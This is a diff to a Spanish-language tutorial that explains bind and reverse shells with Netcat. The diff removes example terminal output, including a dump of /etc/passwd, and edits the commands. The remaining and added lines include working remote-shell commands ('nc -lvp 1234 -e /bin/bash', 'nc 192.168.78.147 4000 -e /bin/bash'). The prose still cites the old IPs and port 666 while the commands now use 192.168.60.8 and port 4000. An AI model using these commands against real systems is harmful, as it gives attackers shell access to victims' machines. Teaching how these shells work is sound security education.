@@ -30,29 +30,12 @@ Un shell inverso es una vulnerabilidad en la que un sistema atacante tiene un oy
 
 ### Netcat
 
-```
-NAME
-                 nc - TCP/IP swiss army knife
-
-SYNOPSIS
-             nc [-options] hostname port[s] [ports] ...
-             nc -l -p port [-options] [hostname] [port]
-
-DESCRIPTION
-             netcat is a simple unix utility which reads and writes
-data across network connections, using TCP or UDP protocol. It is
-designed to be a reliable "back-end" tool that can be used directly
-or easily driven..........>
-
-```
-
 Un atacante podría usar el comando **`nc -lvp 1234 -e /bin/bash`** en el sistema comprometido (192.168.78.6) para crear un escucha en el puerto **`1234`** y ejecutar ( **-e** ) el shell Bash ( **/bin/bash** ).
 
 #### &#x43;_&#x72;eación de un shell de enlace utilizando Netcat._
 
 ```
-~$ nc -lvp 1234 -e /bin/bash
-listening on [any] 1234 ...
+nc -lvp 1234 -e /bin/bash
 ```
 
 > Windows **nc -lvp 1234 -e cmd.exe** Netcat.
@@ -62,20 +45,13 @@ En el sistema atacante (192.168.78.147), se utiliza el comando nc -nv 192.168.78
 #### _Conexión al Bind Shell mediante Netcat_
 
 ```
-~# nc -nv 192.168.78.6 1234
-(UNKNOWN) [192.168.78.6] 1234 (?) open
-ls
-secret_doc_1.doc
-secret_doc_2.pdf
-secret_doc_3.txt
+nc -nv 192.168.60.8 1234
 ```
 
 #### _Un atacante conectado a una víctima mediante un Bind Shell_
 
 ```
-~$ nc -lvp 1234 -e /bin/bash
-listening on [any] 1234 ...
-connect to [192.168.78.6] from (UNKNOWN) [192.168.78.147] 52100 
+nc -lvp 1234 -e /bin/bash
 ```
 
 Uno de los desafíos de usar shells de enlace es que si el sistema de la víctima está detrás de un firewall, el puerto de escucha podría estar bloqueado. Sin embargo, si el sistema de la víctima puede iniciar una conexión con el sistema atacante en un puerto determinado, se puede utilizar un shell inverso para superar este desafío.
@@ -85,15 +61,7 @@ Para crear un shell inverso, puede usar el comando **nc -lvp 666** en el sistema
 #### _Creación de un oyente en el sistema atacante para crear un shell inverso usando Netcat_
 
 ```
-~# nc -lvp 666
-listening on [any] 666 ...
-192.168.78.6: inverse host lookup failed: Unknown host
-connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
-ls
-secret_doc_1.doc
-secret_doc_2.pdf
-secret_doc_3.txt 
-
+nc -lvp 4000
 ```
 
 Luego, en el host comprometido, puede usar el comando **nc 192.168.78.147 666 -e /bin/bash** para conectarse al sistema atacante.
@@ -101,32 +69,8 @@ Luego, en el host comprometido, puede usar el comando **nc 192.168.78.147 666 -e
 _Conexión al sistema atacante (Shell inverso) mediante Netcat_
 
 ```
-~$ nc 192.168.78.147 666 -e /bin/bash
+nc 192.168.78.147 4000 -e /bin/bash
 ```
 
 Una vez que el sistema víctima (192.168.78.6) esté conectado al sistema atacante (192.168.78.147), puede comenzar a invocar comandos.
 
-#### _Ejecutar comandos en el sistema de la víctima a través de un Shell inverso_
-
-```
-~# nc -lvp 666
-listening on [any] 666 ...
-192.168.78.6: inverse host lookup failed: Unknown host
-connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
-ls
-secret_doc_1.doc
-secret_doc_2.pdf
-secret_doc_3.txt
-cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-
-<output omitted for brevity>
-
-```
